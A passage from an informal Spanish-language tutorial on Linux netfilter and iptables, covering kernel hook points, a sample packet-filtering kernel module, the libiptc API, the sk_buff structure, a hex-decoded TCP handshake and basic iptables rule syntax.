netfilter y crear ipchains a partir de ipfwadm es el mantenedor del firewall del Kernel de 
Linux y el que sigue mas de cerca el desarrollo de netfilter e iptables. A pesar de esto, no 
esta solo, cuenta con otros importantes desarrolladores como Marc Boucher y James Morris, 
aunque tambien hay que citar la colaboracion de otro tipo de personal a lo largo de netfilter,
pero estos son los que se dedican ahora mismo del mantenimiento de netfilter en el kernel de 
linux.

Otro de los grandes desarrolladores ademas de Rusty Russel es Harald Welte, es otro de los 
miembros del grupo de netfilter, principal contribuyente de iptables2 en el que hace constar 
la nueva contribucion dada en esta nueva implementacion de iptables en la que se usa nfnetlink 
(netfilter netlink) una nueva mejora sobre la anterior rfnetlink para pasar paquetes del area 
del kernel al area de usuario y principalmente hace uso de una nueva libreria que luego 
comentare que es libipt una API que nos permitira un manejo mucho mas facil debido a su 
simplicidad y una mejor configuracion del firewall por parte de iptables.


1.3 Porque usar netfilter:
==========================

Netfilter fue incorporado en la vercion del kernel 2.4 y supone una serie de mejoras bastante 
interesantes que lo diferencian del tratamiento de paquetes hecho en el kernel 2.0 y 2.2.A 
continuacion dare a conocer algunos aspectos negativos de kernel 2.0 y 2.2:

* Montar un proxy transparente se hace muy dificil.

* No es posible crear reglas de filtrado de paquetes independientes a la interfaz

* Existian incompatibilidades entre el enrutado de los paquetes y el filtrado de los paquetes, 
  teniendo que atravesar los paquetes redirigidos las tres cadenas de todos modos en vez de 
  una unica y no habia manera de saber si estas cadenas podian evitarse.

* Paso de paquetes al area de usuario, No hay establecida una estructura para poder pasar 
  paquetes al espacio de usuario, quizas diras que no, que existia netlink introducido en el 
  kernel 2.2 y si que se podian pasar paquetes desde area de kernel a usuario pero se basaba 
  en la reinyeccion de paquetes que obligaba a sucesivas comprobaciones de  del paquete y por
  lo tanto resultaba bastante lento. 


1.4 Tratando los paques a traves de netfilter:
==============================================

Bueno ahora voy a explicar como se gestionan los paquestes a traves de netfilter y para esto
explicare como llegan los paquetes y la utilizacion de los ganchos, bueno para que comprendan
mejor le hare un dibujo.

(ipv4)
		==========================================================
		=							 =
  		=	===|1|===>|ROUTE|===|3|===>|4|===>		 =
                = 		     |	           ^	    		 =
               	=		     |   	   |	    		 =
	       	=		     |             |			 =    
              	=		    |2|	   	|ROUTE|			 =
               	=		     |	    	   |			 =
               	=		     |            |5|			 =
               	=		     v             |			 =	    	
                =							 =
		=							 =
                ==========================================================


No se rian de mi dibujo porfas :-), bueno este dibujo muestra la llegada de un paquete a 
nuestro sistema. El paquete entra por la izquierda como podemos ver, es sometido a un control 
y son pasados al gancho NF_IP_PRE_ROUTING |1|. Luego entra en el proceso de enrutamiento que 
decide si el paquete va destinado a otra interfaz o a un proceso local. Este proceso puede 
rechazar paquetes que no pueda enrutar.

Si esta dirigido a otra interfaz, se pasara al gancho NF_IP_FORWARD |3| y si esta destinado a 
la propia maquina se pasara al gancho NF_IP_LOCAL_IN |2|. Despues el paquete pasa por un 
proceso final en el que se pasa al gancho NF_IP_POST_ROUTING.

Si los paquetes han sido creados localmente se llamara al gancho NF_IP_LOCAL_OUT que ocurre 
antes de haberse enrutado el paquete.

Para el tratamiento de los paquetes se van a diseñar una serie de modulos que van a escuchar 
a estos ganchos que se van a encargar de la manipulacion del paquete.


	 NF_ACCEPT : Continua el recorrido normalmente.

	 NF_DROP   : Rechaza el paquete.

	 NF_STOLEN : Me hago cargo del recorrido por lo que no continua el
	             recorrido.

	 NF_QUEUE  : Se hace disponer el paquete en una cola que sera tratada
	             desde el espacio de usuario.

	 NF_REPEAT : Vuelve a llamar de nuevo a ese gancho.


Sobre este sistema de manipulacion de paquetes surgio IP Tables sobre netfilter. Es un 
descendiente directo de ipchains (que vino de ipfwadm, que vino de ipfw de BSD) con varias 
extensiones o modulos. Para ello los modulos del kernel pueden registrar una tabla nueva 
(filtrado de paquetes filter, traduccion de direcciones de Direcciones de Rednat y la tabla 
de manipulacion antes del enrutamiento mangle ) e indicar una serie de reglas sobre esos 
paquetes. 

La tabla filter se va a encargar del filtrado de los paquetes para eso se tendra que fijar en 
dos ganchos especificos que seran el NF_IP_LOCAL_IN (entrada), NF_IP_FORWARD (desvio) y 
NF_IP_LOCAL_OUT (salida).

La tabla nat va a usar tres ganchos : NF_IP_PRE_ROUTING y NF_IP_POST_ ROUTING para las 
alteraciones de origen y destino y para alterar el destino de los paquetes se utiliza el 
gancho NF_IP_LOCAL_OUT.


1.5 Programando un modulo netfilter con ganchos:
================================================

Bueno para programar un modulo netfilter con gancho tienes que decidir que protocolo deceas
hookear (enganchar), para esto netfilter divide cada protocolo en una serie de ganchos, en el
caso de ipv4 ya los viste, son los cinco que vimos anteriormente. En el caso que se tratase
con DECnet añade un par más. 

Como anteriormente vimos, Hook NF_IP_PRE_ROUTING puede observar todos los paquetes entrantes, 
para su uso unicamente tendriamos que registrarlo con la funcion nf_register_hook() que nos 
devolvera un 0 si se ha podido registrar ese hook o un numero negativo en caso de error. 
Ademas de poder registrar un gancho, se van a poder definir una serie de operaciones sobre 
ese gancho que viene definido en la estructura nf_hook_ops. Un ejemplo seria algo asi:

static struct nf_hook_ops operations = 
		{ { NULL, NULL }, operation_hook, 
		PF_INET, NF_IP_LOCAL_OUT,
		NF_IP_PRI_FILTER-1};


El primer elemento en la estructura es una lista doblemente enlazada, que se usa internamente. 
La segunda es la funcion a la que vamos a llamar, en este caso operation_hook. Lo siguiente 
es el tipo de protocolo que es el PF_INET, el punto donde registramos el hook NF_IP_LOCAL_OUT 
para los paquetes generados localmente y lo siguiente la prioridad justo antes del filtrado 
del paquete. 

Una vez definidas las operaciones solo nos falta definir esa funcion que realizara las 
operaciones sobre el hook que hayamos indicado en el campo cuarto de la struct nf_hook_ops. 
En este ejemplo, sera una cosa muy sencilla mirara unicamente el paquete que llega y si es 
mas grande de un tamaño determinado lo descartamos.

static unsigned int operation_hook(unsigned int hook, 
					struct sk_buff **skb,
				  const struct net_device *indev, const
				  struct net_device outdev, int (*okfn)
				  (struct sk_buff *))
	
	/* lo primero es ajustar el puntero al comienzo del payload del
	paquete, que es el puntero al comienzo de la cabecera ip mas el
	tamaño de esa cabecera en bytes */
	
	unsigned char *data = (void *) skb->nh.iph + skb->nh.iph->ihl*4;

	skb|= NFC_UNKNOWN;
	switch  ((skb->len) {
		case 100:
			printk("cdt: Cambiamos paquete\n"; 
			data[99]++; /* Aumentamos el tamaño del paquete */
			skb->nfcache |= NFC_ALTERED; /* Modificamos nfcache */
			return NF_ACCEPT; /* Aceptamos el paquete */
		case 200:
			printk("cdt: Rechazamos paquete\n";
			return NF_DROP;
		default: 
			return NF_ACCEPT;
	}

La funcion corre o coge cinco parametros que son los siguientes:

1. El gancho en el que registramos la funcion en este caso NF_IP_LOCAL _OUT.
2. Un puntero a skb que representa al paquete.
3. Un puntero al dispositivo de entrada que es puesto NULL por el gancho NF_IP_LOCAL_OUT.
4. Un puntero al dispositivo de salida que es el dispositvo por el que sale el paquete del 
   gancho NF_IP_LOCAL_OUT.
5. un puntero a una funcion que sera llamada si todos los ganchos son correctos, suele estar 
   definida en los modulos de netfilter pero no se la suele llamar directamente.

Bueno ya visto la famosa funcion nos queda insertar los modulos y esto lo podemos hacer por
init_module() y cleanup_module(), registrando los ganchos o bien usando __init y __exit 
definidos en la cabecera init.h 

Esto nos quedaria:

static init __init init(){
			return nf_register_hook(& operations);
		}

		static void __exit exit(){
			nf_unregister_hook(& operations);
		}

module_init(init);
module_exit(exit);


Espero allas entendido. Ahora solo bastaria probarlo, para ello insertamos el modulo y vemos 
si por ejemplo un ping con cierto tamaño de paquete que es lo que haria y veriamos que en 
caso de 100 lo funka, en 200 lo rechaza y el resto los acepta, para eso mirar tambien los 
logs generados en /var/messages por el printk o dmesg.

Bueno unicamente que la cabecera donde esta definida los hooks de ipv4 es en netfilter_ipv4.h, 
y bueno que necesitaremos tanto de init.h, sk_buff.h, module.h , config.h y ip.h. Luego otra 
cosa que me gustaria comentar es que al igual que lo hemos aceptado o rechazado podriamos 
aber hecho cualquiera de las operaciones explicadas cuando he hablado de los hooks, podriamos 
perfectamente haberlas hecho disponer en una cola con NF_QUEUE, haber aceptado NF_ACCEPT, 
haberlas rechazado NF_DROP, en fin cualquiera de las operaciones definidas arriba, incluso 
volver a llamar al mismo gancho con NF_REPEAT. Otra cosa es que todo esto es tratado en area 
de kernel, por lo que no podemos hacer uso en area de usuario a no ser que usemos la libipq 
diseñada por James Morris para el tratamiento de las colas en el area de usuario.


2.0 Programacion en iptables:
=============================

Bueno antes de todo voy a explicar porque se le dio el nombre de iptables. Unicamente fue por 
la idea de meter varias reglas de memoria como si se tratase de una tabla, se introduce 
informacion para indicar por donde comienza el recorrido a traves de diferentes ganchos que 
dependeran del protocolo que estemos usando como antes hemos dicho ipv4 establece los cinco 
ganchos explicados antes.

Es hora de darle a las estructuras, empesare por las estructuras mas comunes  tanto en espacio 
de usuario como en espacio de kernel aunque algunos campos van a estar restringidos en el area 
de usuario. Otra cosa a tener en cuenta es que iptables no entra dentro de ningun gancho de 
netfilter, este va a usar otros modulos que le van a administrar los paquetes apropiados, 
estos modulos forman parte de los fuentes de netfilter que posteriormente veremos. Para poder 
llegarnos a hacernos nuestros modulos es indispensable saber como se programan LKM's para eso 
hay un articulo muy bueno llamado LKM_hacking que me sirvio de mucho para aprender y comprender.

La primera estructura va a ser la regla que sera lo que posteriormente nos encarguemos de 
meter en memoria a traves de las funciones ya antes mencionadas que esta formada por tres 
estructuras:


* Estructura struct ipt_entry.

* estructuras struct ipt_entry_match, cada una con una cantidad variable de datos (0 o mas) 
  dentro de ella. Se corresponde a la coincidencia o match de la regla.

* estructura "struct ipt_entry_target" con una cantidad variable de datos dentro de ella que 
  corresponde al objetivo de la regla, es decir lo que vamos a realizar sobre el paquete.

Estas estructuras son de tamaño variable para permitir una alta flexibilidad a las extensiones 
especialmente porque cada objetivo (target) o concordancia (match) puede llevar una cantidad 
de datos arbitrario. La verdad que no parece ser adecuado que se use un tamaño arbitrario para 
eso se usa la macro IPT_ALIGN() que es la que realizara un redondeo de forma que no ocupe 
excesivamente y nos aseguraremos de que "ipt_entry" (entrada de una regla en la tabla), 
"ipt_entry_match" (para la concordancia) y 'ipt_entry_target' (para el tamaño del objetivo) 
tengan el tamaño conveniente.

Una estructura struct ipt_entry esta formada por los campos siguientes:

* Una estructura ipt_ip que contiene la cabecera ip con la que tiene que concordar la nueva 
  entrada en la tabla.

* Un campo de bits nf_cache que muestra las partes del paquete que ha examinado esta regla.

* Un campo *target_offset* que indica el desplazamiento del principio de esta regla donde 
  comienza el objetivo de la regla (la estructura ipt_entry_target).

* Un campo next_offset que indica el tamaño total de la regla indicando la concordancia y el 
  objetivo (match y target).

* Un campo comefrom que se utiliza para saber el recorrido del paquete.

* Un campo struct ipt_counters.


2.1 Libreria libiptc:
=====================

Esta una biblioteca que va a usar iptables para listar y manipular las reglas de los paquetes 
y va a necesitar privilegios de root para poder hacer uso de ella. Iptables no es mas que una 
tabla de reglas definidas en una serie de cadenas y a traves de esta biblioteca se va a 
permitir el manejo de esta. Para poder empezar a leer de la tabla se va a llamar a la funcion 
iptc_init() y se va a poder manipular a traves de tres funciones que son:

* iptc_insert_entry()   Inserta una nueva regla al principio de la tabla.
* iptc_replace_entry()  Sustituye una entrada en la tabla.
* iptc_append_entry()   Agrega al final de la tabla una nueva regla.
* iptc_delete_entry()   Elimina una entrada de la tabla.
* iptc_flush_entries()  Vacia todas las reglas.
* iptc_zero_entries()   Pone todas las reglas a cero.
* iptc_create_chain()   Crea una nueva cadena en la tabla.
* iptc_delete_chain()   Borra una cadena de la tabla.
* iptc_set_policy()     Fija una politica sobre la cadena (DROP, REJECT ..)
* iptc_commit()         Sirve para guardar los cambios, hasta que no se llama
	                a esta funcion no quedan reflejados los cambios en la tabla.

ademas de estas funciones hay otras funciones que pueden resultar de gran ayuda como son:

* iptc_first_chain()  Devuelve el primer nombre de cadena de la tabla iptc_next_chain()
* iptc_next_chain()   Devuelve el siguiente nombre de cadena de la tabla iptc_builtin()
* iptc_builtin()      Devuelve true si el nombre de la cadena dada es una cadena montada.
* iptc_first_rule()   Devuelve el puntero a la primera regla del nombre de cadena dada.
* iptc_next_rule()    Devuelve puntero a la siguiente regla de la cadena dada.
* iptc_get_target()   Obtiene el objetivo de una regla dada. Si es un salto a otra cadena se 
                      devuelve el nombre de la cadena. Si es un veredicto (p.e: DROP) se 
                      devuelve su nombre. Y sino tiene objetivo entonces se devuelve la cadena 
                      vacia (NULL).

En todas estas reglas en caso de no encontrarse primera regla, siguiente regla primera 
cadena, se devolverá la cadena vacia NULL.


2.2 Conociendo los socket buffer (skb's):
=========================================

Los socket buffers no son nada mas que unos buffers que utiliza el kernel de linux para el 
manejo de paquetes. Para explicarlo mas en detalle, digamos que cuando llega un paquete a 
nuestra maquina sigue un proceso el cual es, recibe el paquete a traves de la tarjeta de red, 
lo pone en el skbuff y este lo pasara a la pila del protocolo correspondiente, digamos que 
es como una cola de mensajeria de paquetes que va a ir pasando al area del kernel y este va 
a llevar la gestion de dichos paquetes.

* Estructura skb:

La estructura de un socket buffer se encuentra en <linux/skbuff.h> y esta formada por:

struct sk_buff {        /* These two members must be first. */
	 struct sk_buff  * next;                 /* Next buffer in list
	 struct sk_buff  * prev; /* Previous
         struct sk_buff_head * list;             /* List we
	 struct sock     *sk;                    /* Socket we
	 struct timeval  stamp;      
	 struct net_device *dev;  
	 union {
	       struct tcphdr   *th;
	       struct udphdr   *uh;
	       struct icmphdr  *icmph;
	       struct igmphdr  *igmph;
	       struct iphdr    *ipiph;
	       struct spxhdr*spxh;
	       unsigned char   *raw;
	       } h;
	 /* Network layer header */
         union {
	       struct iphdr    *iph;
	       struct ipv6hdr  *ipv6h;
	       struct arphdr   *arph;
	       struct ipxhdr   *ipxh;
	       unsigned char   *raw;
	       } nh;
         union {
	       struct ethhdr   *ethernet;
               unsigned char   *raw;
	       } mac;

        struct  dst_entry *dst;

        /*
         * This is the control buffer. It is free to use for every
         * layer. Please put your private variables there. If you
         * want to keep them across layers you have to do a skb_clone()
         * first. This is owned by whoever has the skb queued ATM.
         */
        char            cb[48];

 unsigned int    len;                    /* Length of actual data                      */
 unsigned int    data_len;
 unsigned int    csum;                   /* Checksum                                   */
 unsigned char   __unused,               /* Dead field, may be reused                  */
 cloned,                 /* head may be cloned (check refcnt to be sure). */
 pkt_type,               /* Packet class                                 */
 ip_summed;              /* Driver fed us an IP checksum                 */
 __u32           priority;               /* Packet queueing priority                    */
 atomic_t        users;                  /* User count - see datagram.c,tcp.c           */
 unsigned short  protocol;               /* Packet protocol from driver.                */
 unsigned short  security;               /* Security level of packet                    */
 unsigned int    truesize;               /* Buffer size                                 */

 unsigned char   *head;                  /* Head of buffer                              */
 unsigned char   *data;                  /* Data head pointer                           */
 unsigned char   *tail;                  /* Tail pointer                                */
 unsigned char   *end;                   /* End pointer                                 */

        void       (*destructor)(struct sk_buff *);        /* Destruct function         */
#ifdef CONFIG_NETFILTER
        /* Can be used for communication between hooks. */
        unsigned long   nfmark;
        /* Cache info */
        __u32           nfcache;
        /* Associated connection, if any */
        struct nf_ct_info *nfct;
#if defined(CONFIG_HIPPI)
        union{
                __u32   ifield;
        } private;
#endif

#ifdef CONFIG_NET_SCHED
       __u32           tc_index;               /* traffic control index */
#endif
};

Bueno aqui tienes enterita la estructura sk_buff, ahora ire explicando cada uno:

	next : es el siguiente skb en la lista.
	prev : es el anterior skb en la lista.
	list : lista en la que nos encontramos.
	sk : es el socket que estamos utilizando.
	stamp : valor tiempo en el que nos llego.
	dev : dispositivo que nosotros estamos dejando.
	rx_dev : desde el dispositivo que nos llego.
	h : cabecera de la capa de transporte (tcp, udp, icmp, igmp, spx, raw)
	nh : cabecera de la capa de red (ip, ipv6, arp, ipx, raw)
	mac : cabecera del nivel de enlace
	dst
	cb : buffer de control.
	len : longitud del dato.
	csum : checksum.
	used 
	is_clone : es una copia sk_buff.
	cloned : la cabecera se puede copiar.
	pkt_type : el tipo de paquete.
	ip_summed
	priority : prioridad del paquete dentro de la cola de paquetes.
	protocol : protocolo del paquete.
	security : nivel de seguridad del paquete
	truesize : verdadero tamaño del skb.
	head : puntero al principio del buffer.
	data : puntero al principio del dato.
	tail : puntero al final del dato.
	end : final del puntero.
	destructor : destructor de la funcion.
	nfcache : info de la cache interna referente a netfilter.
	nfct : conexion asociada al socket.


Bueno como puedes ver en el sniffer es bastante facil de entender, la unica parte tediosa es 
la de ajustar los punteros segun el tipo de paquete que nos llegue. Si se trata de un paquete 
tcp veamos como se ajustan los punteros:

* Tendremos que ajustar un puntero al principio de la cabecera tcp, para ello lo unico que 
  tendremos que hacer es sumarle al principio del dato la cabecera ip en bytes.

* Luego ajustaremos el puntero al comienzo del dato util, denominado "payload", para ello 
  unicamente bastara sumarle la cabecera tcp correspondiente y estaremos al comienzo del 
  payload.

* La longitud del dato es el paquete total menos las cabecera tcp y la cabecera ip, ahora 
  unicamente nos falta llevarlo a la practica como hemos podido ver en el sniffer.

En caso de tratarse de un paquete icmp o udp unicamente tendremos que sumarle el tamaño de las 
cabeceras que se lo decimos haciendo un sizeof de la estructura de lo que es la icmphdr y la 
udphdr. Luego otra cosa unicamente a saber es que doff va a tratarse de la cabecera tcp 
("data offset ") y cuando lo multiplicamos por 4 es unicamente porque viene en grupos de 32 
bits y de esa forma sacamos su tamaño en bytes.


2.3 Como se establece una conexion:
===================================

Aca hablaremos del metodo three-way hand-shake que es el que se utiliza para establecer una 
comunicacion entre dos maquinas. Para ello el protocolo TCP va a usar una serie de flags que 
va a hacer posible una negociacion de la conexion, en el que entre una comunicacion entre 
cliente servidor, el cliente mandara un primer mensaje SYN al servidor, el servidor le 
respondera al cliente con una respuesta SYN/ACK y finalmente el cliente realizara la
confirmacion ACK. La verdad que no tiene mas misterio que esto, pero este metodo puede ser 
util para el filtrado de paquetes para ello unicamente nos tenemos que fijar que ciertos 
flags del protocolo tcp no tienen sentido en determinado estados para ello cuando recibamos 
un paquete con un flag fin o rst no tiene sentido dejarlo pasar, pero bueno eso ya lo vimos 
en el ejemplo de skb's como filtramos rst y fin.

Los estados de los que cuenta el flag tcp son los siguientes:

SYN FLAG: Toma su nombre del flag tcp Synchronize que es el que se encarga de la 
sincronizacion entre dos hosts.

18:02:47.540000 10.0.0.2.1061 > 161.58.243.241.80: S [tcp sum ok] 2024485176:2024485176(0) 
win 5840 <mss 1460,sackOK,timestamp 62577060 0,nop,wscale 0> (DF) (ttl 64, id 59548, len 60)
0x0000 4500 003c e89c 4000 4006 b2f1 0a00 0002 E....@.@....... 


Capa IP

	      45 - IP Version / Longitud de la cabecera (IPv4, 5)
	      00 003c - Longitud (60)
	      e89c - Identidad del Fragmento (59548)
	      40 - Flags IP (Sin fragmentar, Ultimo fragmento)
	      00 - Desplazamiento dentro del fragmento (0)
	      40 - Tiempo de Vida (64)
	      06 - Tipo del Protocolo IP (06/TCP)
	      b2f1 - Checksum IP (45809)
	      0a00 0002 - Direccion IP origen (10.0.0.2)
	      a13a f3f1 - Direccion IP destino (161.52.243.241)

      
Capa TCP

	0x0010              0425  0050  78ab  3138  0000  0000  .:...%.Px.18....
	0x0020  a002  16d0  0652  0000  0204  05b4  0402  080a  .....R..........
	0x0030  03ba  d9a4  0000  0000  0103  0300              ............
        0425 - Puerto Origen (1061)
        0050 - Puerto Destino (80)
        78ab 3138 - Numero de Secuencia (2024485176)
        0000 0000 - Numero de Reconocimiento (0)
	a - Logitud de la Cabecera 10
        0 - Reservado

        02 - Bits de control, Flag TCP (SYN)
	      
	      Existen 6 bits de control. Si el bit esta puesto a 1 significa
	      que esta activado el flag. Los bits son los siguientes:

		Flag
		Urgent      Acknowledgement  Push  Reset  Syn  Fin
		Valor Hx         20           10     8     4    2   

	16d0 - Tamaño Ventana (5840)
	0652 - Checksum (1618)
	0000 - Puntero al dato urgente.
        
	Opciones TCP
        0204 - Opciones (Tipo 2, Longitud 4 - Máximo tamaño de segmento)
        Esta opcion permite enviar con el maximo tamaño de segmento que el
	receptor pueda recibir. 
        05b4 - Tamaño maximo del segmento (1460)
        0402 - Opciones (Tipo 4, Longitud 2 - ACK)
        080a - Opciones (Kind 8, Length 10 - Timestamp) 
        03ba d9a4 - Timestamp (62577060) 
        0000 0000 0103 - Opciones (Clase 1, Longitud 3 - Ninguna operacion) 
        0300 - Opciones (Tipo 3, Longitud 0 - Tamaño Ventana 0)



SYN/ACK

Una vez ya establecida la comunicacion entre los dos hosts, en la segunda parte lo que hace 
threeway handshake es dar una respuesta por parte del servidor al cliente. El mensaje que 
el server envia contiene un reconocimiento (ACK de aknowledgement) de la llegada del mensaje 
original, y sus propios numeros de sincronizacion.

	18:02:47.630000 161.58.243.241.80 > 10.0.0.2.1061: S [tcp sum ok]
	1426552139:1426552139(0) ack 2024485177 win 17520 <mss 1460> (DF)
	(ttl 42,id 35144, len 44)

	0x0000  4500  002c  8948  4000  2a06  2856  a13a  f3f1  E..,.H@.*.(V.:..
	0x0010  0a00  0002  0050  0425  5507  754b  78ab  3139  .....P.%U.uKx.19
	0x0020  6012  4470  3bcc  0000  0204  05b4              `.Dp;.......
	IP Layer -
        45 - Version IP / Longitud Cabecera (IPv4, 5)
        00 002c - Longitud (44)
        8948 - Identificador del fragmento (35144)
        40 - Flags IP (Sin fragmentar, Ultimos fragmento)
	00 - Desplazamiento en el paquete (0)
        2a - Tiempo de vida (42)
        06 - Tipo de protocolo (06/TCP)
        2856 - Cheksum IP (10326)
        a13a f3f1 - Direccion IP Origen (161.52.243.241)
        0a00 0002 - Direccion IP Destino (10.0.0.2)
        
	Capa TCP -
        0050 - Puerto Origen (80)
        0425 - Puerto Destino (1061)
        5507 754b - Numero de secuencia (1426552139)
        78ab 3139 - Numero de Reconocimiento (2024485177)

        6 - Longitud de la Cabecera 6
        0 - Reservado
        12 - Bits de Control, Flags TCP (SYN, ACK)
        4470 - Tamaño de la Ventana (17520)
        3bcc - Checksum (15308)
        0000 - Puntero a URG
   
   TCP Options -
      0204 - Opciones (Tipo 2, Longitud 4 - Tamaño maximo de segmento)

      05b4 - Tamaño Maximo del Segmento (1460)


ACK

Finalmente, el cliente reconoce la secuencia de numeros del servidor. Esto marca el final 
del three-way handshake. La conexion TCP esta ahora abierta, y la informacion puede ser 
transmitida por las respectivas aplicaciones.

       18:02:47.630000 10.0.0.2.1061 > 161.58.243.241.80: . [tcp sum ok]
       2024485177:2024485177(0) ack 1426552140 win 5840 (DF) (ttl 64, id 59549,
       len 40)
       0x0000  4500  0028  e89d  4000  4006  b304  0a00  0002  E..(..@.@.......
       0x0010  a13a  f3f1  0425  0050  78ab  3139  5507  754c  .:...%.Px.19U.uL
       0x0020  5010  16d0  8129  0000  0000  0000  0000        P....).......

Capa IP
       45 - Version IP / Longitud Cabecera (IPv4, 5)
       00 0028 - Longitud (40)
       e89d - Identificador del Fragmento (59549)
       40 - Flags IP (Sin fragmentar, Ultimo fragmento)
       00 - Desplazamiento en el Fragmento (0)
       40 - Tiempo de Vida (64)
       06 - Tipo de Protocolo IP (06/TCP)
       b304 - Checksum IP (45828)
       0a00 0002 - Dirección IP Origen (10.0.0.2)
       a13a f3f1 - Dirección IP Destino (161.52.243.241)

Capa TCP
       0425 - Puerto Origen (1061)
       0050 - Puerto Destino (80)
       78ab 3139 - Numero de Secuencia (2024485177)
       5507 754c - Numero de Reconocimiento (1426552140)


       5 - Longitud de la Cabecera 5
       0 - Reservado

       10 - Bits de Control, Flag TCP (ACK)
       16d0 - Tamaño Ventana  (5840)
       8129 - Checksum (33065)
       0000 - Puntero a dato Urgente
       
       Opciones TCP  -
    
       0000 0000 0000 - Opciones (Relleno del paquete)
 


2.4 Iptables (cadenas y formatos):
==================================

El kernel comienza con tres listas de reglas en la tabla de "filtros". Estas cadenas se 
llaman cadenas cortafuegos o simplemente "cadenas" y se denominan INPUT, OUTPUT y FORWARD 
(entrada, salida y reenvio respectivamente). Una de las utilidades fundamentales de iptables 
es la modificacion de estas tres cadenas de reglas. Para mayor aclaracion una cadena es una 
lista de reglas, en la que cada regla especifica una norma, seria como decir "si el paquete 
se parece a esto, haz esto otro". Si la primera regla no se ajusta al paquete entonces se 
consulta la siguiente regla en la lista. Al final, sino hay más reglas que consultar, el 
nucleo mira la politica de la cadena para decidir que hacer. En un sistema en el que la 
seguridad sea lo que se busque se usara la politica de rechazo de paquetes que suele ser la 
mas segura (DROP) sino se podria utilizar la de aceptar todo por defecto (ACCEPT).

A continuacion veremos que pasa cuando llega a nuestro firewall un paquete:

*Lo primero que hara el kernel es mirar a quien va dirigido el paquete, es decir se encargara 
 de mirar el enrutado del paquete.

*Si esta destinado a esa misma maquina, el paquete entra en la cadena INPUT. Si en la cadena 
 INPUT no hay nada que se lo impida, el pakete llegara al proceso que lo este esperando 
 aunque nosotros posteriormente veremos que a traves de la modificacion de una serie de 
 reglas en la cadena INPUT este paquete sera tratado conforme a estas reglas pero para el 
 caso el paquete sera introducido en la cadena INPUT.

*Si no viene destinado a la maquina en el cual esta el firewall, y el kernel no tiene 
 activado el encaminamiento de paquetes, o no sabe como encaminarlo, el paquete sera 
 descartado. Si el enrutamiento esta activado, y el paquete va dirigido a otro interfaz de 
 red (en caso que lo tengamos), el paquete ira directo a la cadena reenviar (FORWARD). Si 
 el paquete es aceptado, sera enviado hacia fuera. De todos modos para poder hacer uso de 
 este es necesario que haya soporte en el kernel.

*Finalmente un programa que se ejecuta en la maquina puede enviar paquetes a la red. Estos
 paquetes pasan por la cadena de salida (OUTPUT) de forma inmediata; si son aceptados, 
 entonces el paquete continua hacia afuera, dirigido a la interfaz a la que estuviera 
 destinado. Luego se vera el tratamiento de las interfazes a traves de la reglas, en este 
 caso al tratarse de una cadena OUTPUT unicamente se podria hacer uso de out-interface (-o) 
 como por ejemplo eth0.

Antes de poder usar iptables, tanto en sus funciones de firewall como de gestor de NAT, 
debemos tener activadas las opciones CONFIG_IP_ADVANCED_ ROUTER, CONFIG_IP_ROUTE_NAT y 
CONFIG_IP_NF_TABLES, ademas del conveniente soporte para iptables en el kernel referido 
tanto a modulos, reglas,politicas que luego quieras usar posteriormente.


2.5 Comandos basicos:
=====================

Uff depues de tanto explicar y explicar, ahora pondremos en funcionamiento todo lo escrito y
explicado anteriormente, empezaremos por la sintaxis basica de iptables para la modificacion 
de las cadenas: 

* crear una nueva cadena --> -N
* Borrar una cadena vacia --> -X
* cambiar la politica de una cadena de uso interno --> -P
* Vaciar de reglas una cadena --> -F
* Poner a los contadores de paquetes y bytes de todas las reglas de una cadena --> -Z
* Listar las reglas de una cadena --> -L

Sintaxis basica de iptables para la modificacion de reglas:

* Añadir una nueva regla a una cadena --> -A
* Mover una regla a otra posicion dentro de una cadena --> -R
* Insertar una nueva regla en alguna posicion de la cadena --> -I
* Borrar una regla de un sitio en particular de una cadena ---> -D
* Borrar la primera regla que coincida con los parametros dados en una cadena --> (-D)

Bueno Empezaremos con una regla generica en la que podremos observar la sintaxis completa de 
iptables. Para ello usaremos varias opciones de iptables que explicaremos mas adelante y una 
serie de variables que se pueden entender sin apenas explicacion, bueno veamos un ejmplo.

iptables -A $cadena -p $protocolo -s $ip_de_origen --sport $puerto_de_origen
-d $ip_de_destino --dport $puerto_de_destino -i $interfaz_de_entrada -o 
$interfaz_de_salida -j $accion

Para borrar la cadena que acabamos de añadir, tendremos que hacer esto:

iptables -D 1   o    iptables -D $cadena -p $protocolo -s $ip_de_origen

La primera forma de eliminar la regla, decimos a iptables que elimine la regla que esta en 
la primera posicion, ya que se supone que es la primera regla que añadimos en el sistema. 
Con la segunda opcion le decimos a iptables que elimine la regla que tenga los parametros 
que hemos especificado. Otra forma seria utilizar iptables -F pero vaciariamos todas las 
reglas, sería una forma de inutilizar iptables totalmente por si acaso hemos tenido un 
problema de cualquier tipo.


2.6 Parametros:
===============

Como pudiste ver en la regla que hemos insertado el parametro -p $protocolo para especificar 
el protocolo, el parametro -s para especificar la fuente del paquete y el parametro -d para 
especificar el destino. A continuacion, describo todos los paquetes que podemos pasar a 
iptables.

Especificar IP de origen o de destino : el origen lo especificamos con -s o --source y el 
destino con -d o --destination. La ip se suele indicar de varias maneras.

* Indicando el nombre completo ejemplo: culturadigitalt.cl
* Indicando la IP ejmplo: 192.168.1.1
* Indicando un grupo de IP ejmplo: 200.10.41.0/255.255.255.255

Al escribir una "!"(sin las commilas) antes de la IP estaremos indicando todo excepto  
ejemplo -s !192.168.1.1 asi le estamos diciendo todo lo que No venga de 192.168.1.1 Tambien 
tenemos que tener en cuenta que 0/0 significa cualquier ip.

iptables -A OUTPUT -s 0/0 -d ! culturadigital.cl -j ACCEPT

Esto deja salir todos los paques que no vayan a culturadigital.cl

Especificar el protocolo: El protocolo lo indicaremos con -p o -protocol. Podemos especificar 
TCP, UDP e ICMP este parametro ignora mayusculas y minusculas, con lo cual tcp 
o TCP es lo mismo.

iptables -A INPUT -p icmp -s 0/0 -d 192.168.1.55 -j DROP

Con esto denegamos la entrada de paquetes ICMP que tengan como destino la ip 192.168.1.55

Especificar el dispositivo: Al contrario que ipchains, iptables tiene la capacidad de 
distinguir entre dispositivo de entrada  y dispositivo de salida. No podremos usar el 
parametro -o en la cadena INPUT ni el parametro -i en la cadena OUTPUT, la cadena FORWARD si 
que admite los dos parametros.

iptables -A FORWARD -p tcp -s 0/0 -d 0/0 -dport 0:1024 -i ppp0 -o eth1 -j DROP

Aca denegamos todos los paquetes que vengan por ppp0 y vayan hacia eth1 y que tengan como 
los puertos destino del 0-1024.

Especificar fragmentos de paquetes: En ocasiones cuando el paquete es demasiado largo como 
para transmitirlo de una sola vez, es necesario dividirlo en fragmentos, y enviarlos como si 
se tratasen de multiples paquetes. Esto nos trae el siguiente problema: el primer fragmento 
